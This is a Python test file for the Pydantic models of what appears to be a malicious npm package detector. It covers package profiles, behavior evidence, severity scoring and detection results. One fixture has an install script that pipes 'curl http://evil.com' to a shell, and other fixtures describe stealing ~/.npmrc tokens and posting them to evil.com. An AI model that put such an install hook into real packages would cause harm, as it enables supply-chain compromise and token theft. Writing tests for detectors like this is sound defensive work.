"""
Test suite for Pydantic models.
Test model validation, serialization
"""

import sys
from pathlib import Path
from datetime import datetime

project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))

try:
    from src.data.models import PackageProfile, Behavior, BehaviorCategory, DetectionResult, ConsolidatedPattern

    print("Models imported successfully for testing\n")
except ImportError as e:
    print(f"Error importing models: {e}")
    print("Check if the project root path is correctly set.")
    sys.exit(1)
    
def test_package_profile_validation():
    """ Test PackageProfile model validation """
    
    print("\n" + "="*40)
    print("Running PackageProfile validation test...")
    print("="*40)
    
    try:
        profile_data = PackageProfile(
            package_name="test-package",
            version="1.0.0",
            scripts={
                "install": "curl http://evil.com | sh",
                "test": "echo 'test'"                
            },
            dependencies={
                "lodash": "^4.17.21",
                "express": "^4.17.1"
            },
            dev_dependencies={
                "jest": "^26.6.3"
            },
        )
        
        print("PackageProfile created successfully.")
        print(f"Package Id: {profile_data.package_name}")
        print(f"Name: {profile_data.package_name}")
        print(f"Version: {profile_data.version}")
        print(f"Label: {profile_data.label}")
        print(f"Dependencies: {profile_data.dependencies}")
        print(f"Dev Dependencies: {profile_data.dev_dependencies}")
        print(f"Scripts: {list(profile_data.scripts.keys())}")

        pkg_dict = profile_data.model_dump()
        print(f"\nSerialization works: {len(pkg_dict)} fields in dict")

        pkg_json = profile_data.model_dump_json(indent=2)
        print(f"JSON export works: {len(pkg_json)} bytes")
        
        return True
    
    except Exception as e:
        print(f"Package Test failed with error: {e}")
        import traceback
        traceback.print_exc()
        return False    
        
def test_behavior():
    """
    Test Behavior model validation with evidence anchoring.
    """
    print("\n" + "="*40)
    print("Running Behavior model test...")
    print("="*40)
    
    try:
        behavior = Behavior(
            category=BehaviorCategory.CREDENTIAL_THEFT,
            package_name="malicious-package",
            summary="Steals NPM tokens from .npmrc file",
            details="Reads ~/.npmrc and sends content to external server using HTTP POST",
            evidence_files=[".npmrc", "~/.npmrc"],
            evidence_domains=["evil.com", "malicious.org"],
            evidence_apis=["fs.readFileSync", "http.request"],
            confidence=0.95
        )
        
        print("Behavior created successfully.")
        print(f"Behavior ID: {behavior.behavior_id}")
        print(f"Package Name: {behavior.package_name}")
        print(f"Category: {behavior.category.value}")
        print(f"Severity: {behavior.severity} (auto-assigned)")
        print (f"Confidence: {behavior.confidence}")
        print(f"Evidence Files: {behavior.evidence_files}")
        print(f"Evidence Domains: {behavior.evidence_domains}")
        print(f"Evidence APIs: {behavior.evidence_apis}")
        

        print("\nTesting evidence anchoring without evidence...")
        try:
            behavior_no_evidence = Behavior(
                category=BehaviorCategory.CODE_INJECTION,
                package_name="suspicious-package",
                summary="Injects code into runtime",
                details="Modifies global objects to alter behavior",
                confidence=0.85
            )
            print("Evidence anchoring FAILED: Behavior without evidence should have raised an exception.")
            return False
            
        except ValueError as ve:
            print(f"Evidence anchoring works! Rejected behavior without evidence")
            print(f"Error message: {str(e)[:100]}...")
            
        
        return True
    except Exception as e:
        print(f"Behavior Test failed with error: {e}")
        import traceback
        traceback.print_exc()
        return False
    
def test_severity_calculation():
    """Test automatic severity assignment"""
    print("\n" + "="*40)
    print("Running Automatic Severity Calculation test...") 
    print("="*40)
    
    test_cases = [
        {
            "category": BehaviorCategory.CREDENTIAL_THEFT,
            "confidence": 0.9,
            "expected": "critical"
        },
        {
            "category": BehaviorCategory.NETWORK_EXFILTRATION,
            "confidence": 0.85,
            "expected": "high"
        },
        {
            "category": BehaviorCategory.OBFUSCATION,
            "confidence": 0.7,
            "expected": "medium"
        },
        {
            "category": BehaviorCategory.CREDENTIAL_THEFT,
            "confidence": 0.2,
            "expected": "high"
        }
    ]
    
    all_passed = True
    for i, test in enumerate(test_cases, 1):
        try:
            behavior = Behavior(
                package_name="test-pkg",
                category=test["category"],
                summary="Test behavior for severity calculation",
                details="Testing automatic severity assignment based on category and confidence",
                evidence_apis=["test.api"],
                confidence=test["confidence"]
            )
            
            if behavior.severity == test["expected"]:
                print(f"Test {i}: {test['category'].value} @ confidence {test['confidence']} "
                      f"→ severity={behavior.severity}")
            else:
                print(f"⚠️      Test {i}: Expected {test['expected']}, got {behavior.severity}")
                all_passed = False
                
        except Exception as e:
            print(f"Test {i} FAILED: {e}")
            all_passed = False
    
    return all_passed


def test_detection_result():
    """Test DetectionResult with confidence breakdown"""
    print("\n" + "="*40)
    print("TEST 4: DetectionResult Validation")
    print("="*40)
    
    try:
        result = DetectionResult(
            package_name="suspicious-package",
            package_version="1.0.0",
            classification="malicious",
            overall_confidence=0.82,
            confidence_scores={
                "pattern_similarity": 0.91,
                "chain_completeness": 0.88,
                "context_violation": 0.75,
                "cross_perspective_consistency": 0.73
            },
            risk_vector=[
                BehaviorCategory.CREDENTIAL_THEFT,
                BehaviorCategory.NETWORK_EXFILTRATION
            ],
            explanation="Package exhibits credential theft behavior by reading .npmrc and exfiltrating data to external server",
            threshold_used=0.75,
            detected_behaviors=["BR12345678", "BR87654321"]
        )
        
        print("DetectionResult created successfully!")
        print(f"Package: {result.package_name}@{result.package_version}")
        print(f"Classification: {result.classification}")
        print(f"Overall Confidence: {result.overall_confidence:.3f}")
        print(f"Risk Level: {result.risk_level}")
        print(f"Risk Vector: {[cat.value for cat in result.risk_vector]}")
        print(f"Boundary Case: {result.is_boundary_case}")
        print(f"Should Escalate: {result.should_escalate_for_review()}")
        
        print("\nTesting confidence score validation...")
        try:
            bad_result = DetectionResult(
                package_name="test",
                package_version="1.0.0",
                classification="benign",
                overall_confidence=0.5,
                confidence_scores={
                    "pattern_similarity": 0.1,
                    "chain_completeness": 0.1,
                    "context_violation": 0.1,
                    "cross_perspective_consistency": 0.1
                },
                threshold_used=0.5,
                explanation="Test"
            )
            print("⚠️   Confidence validation warning (might be acceptable)")
        except ValueError as e:
            print(f"Confidence validation works! Caught mismatch")
        
        return True
        
    except Exception as e:
        print(f"DetectionResult test FAILED: {e}")
        import traceback
        traceback.print_exc()
        return False


def test_consolidated_pattern():
    """Test ConsolidatedPattern for training phase"""
    print("\n" + "="*40)
    print("TEST 5: ConsolidatedPattern Validation")
    print("="*40)
    
    try:
        pattern = ConsolidatedPattern(
            category=BehaviorCategory.CREDENTIAL_THEFT,
            canonical_behavior="Accesses .npmrc file and sends credentials to external server",
            frequency_in_training=15,
            confidence_in_training=0.89,
            cluster_size=23,
            semantic_embedding=[0.1] * 384,  # Mock 384-dim embedding
            source_behavior_ids=["BR123", "BR456", "BR789"]
        )
        
        print("ConsolidatedPattern created successfully!")
        print(f"Pattern ID: {pattern.pattern_id}")
        print(f"Category: {pattern.category.value}")
        print(f"Frequency: {pattern.frequency_in_training}")
        print(f"Cluster size: {pattern.cluster_size}")
        print(f"Embedding dimensions: {len(pattern.semantic_embedding)}")
        
        similarity = 0.87
        weighted = pattern.calculate_weighted_score(similarity)
        print(f"\nWeighted score calculation works!")
        print(f"Raw similarity: {similarity:.3f}")
        print(f"Weighted score: {weighted:.3f}")
        
        return True
        
    except Exception as e:
        print(f"ConsolidatedPattern test FAILED: {e}")
        import traceback
        traceback.print_exc()
        return False


def main():
    """Run all tests"""
    print("\n" + "="*25)
    print("   PYDANTIC MODELS VALIDATION TEST SUITE")
    print("="*25 + "\n")
    
    results = {}
    
    # Run all tests
    results["PackageProfile"] = test_package_profile_validation()
    results["Behavior"] = test_behavior()
    results["Severity Calculation"] = test_severity_calculation()
    results["DetectionResult"] = test_detection_result()
    results["ConsolidatedPattern"] = test_consolidated_pattern()
    
    # Summary
    print("\n" + "="*40)
    print("TEST SUMMARY")
    print("="*40)

    total = len(results)
    passed = sum(1 for v in results.values() if v)
    
    for test_name, result in results.items():
        status = "PASS" if result else "FAIL"
        print(f"{status} - {test_name}")
    
    print(f"\nResults: {passed}/{total} tests passed ({(passed/total)*100:.0f}%)")
    
    if passed == total:
        print("\nAll tests passed! Your models are ready for dataset loading.")
        return 0
    else:
        print("\n⚠️     Some tests failed. Fix issues before proceeding.")
        return 1


if __name__ == "__main__":
    sys.exit(main())
    

        

    
  